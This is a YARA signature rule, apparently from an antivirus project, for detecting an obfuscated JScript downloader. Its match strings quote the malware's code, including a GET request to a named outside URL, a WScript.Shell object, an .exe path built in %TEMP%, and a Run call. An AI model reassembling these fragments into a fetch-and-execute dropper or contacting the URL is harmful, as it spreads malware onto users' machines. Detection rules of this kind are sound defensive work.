rule sig_20160401_a6d7a9ddd00d7b19550a60a219f179c6 {
  meta:
    description = "datamaliciousorder - file 20160401_a6d7a9ddd00d7b19550a60a219f179c6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "17945ba65b8b431f4445ca723d82c125c85d9ef2c040730071819f7930d29d67"

  strings:
    $s1  = "MnbVbj[VcXax](\"G\" + \"ET\", \"http://langeparis.com.au/s0powa\", false);" fullword ascii
    $s2  = "var LkXe = function MobJni() {return WScript[GinXks](\"WScript\"+\".Shell\");}(), AfgRmp = 11;" fullword ascii
    $s3  = "function YuIyv(NkqIys, UqhYa){IpFuo = IpFuo * 1; return NkqIys - UqhYa;};" fullword ascii
    $s4  = "if (MnbVbj[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function BjJci() {return LkXe[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ajj8i7cvNp4y.ex\" + \"e\";};" fullword ascii
    $s6  = "function JhStm(){return AneBo + \"\";};" fullword ascii
    $s7  = "function IrbInf(UwxCxf) {var VvFni = (1, 2, 3, 4, 5, UwxCxf); return VvFni;};" fullword ascii
    $s8  = "function CnwIi() {return ((KzwAv == true) && (KzwAv == PvxIfn)) ? 1 : IpFuo;};" fullword ascii
    $s9  = "return YuIyv(ZjqSu, BblBj);" fullword ascii
    $s10 = "var HqUr = false;" fullword ascii
    $s11 = "PvxIfn = true; " fullword ascii
    $s12 = "function IepWgy(){return 23;};" fullword ascii
    $s13 = "KzwAv = true; " fullword ascii
    $s14 = "function WrnOvk()" fullword ascii
    $s15 = "function FeKx(){return GinXks;};" fullword ascii
    $s16 = "var PvxIfn = false;" fullword ascii
    $s17 = "function IgzHt(ZhdJd){LkXe[\"R\"+\"un\"](ZhdJd, IpFuo, IpFuo);};" fullword ascii
    $s18 = "var KzwAv = false;" fullword ascii
    $s19 = "var WqZm = new this[\"Date\"]();" fullword ascii
    $s20 = "}while (HxnVo);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}